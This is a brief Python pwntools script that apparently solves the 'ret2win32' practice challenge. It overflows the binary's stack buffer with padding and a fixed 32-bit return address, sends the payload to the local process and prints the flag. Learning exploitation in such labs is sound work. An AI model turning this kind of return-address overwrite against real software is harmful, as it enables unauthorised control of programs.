from pwn import *

payload = b""
payload += b"A"*(54-8-2)
payload += pack(0x0804862c, 32)

write("/tmp/docgil",payload)

p = process(["ret2win32"])
r = p.recv().decode("utf-8")
log.info(f"r: {r}")

p.send(payload)
flag = p.recvall().decode("utf-8")
log.info(f"flag: {flag}")
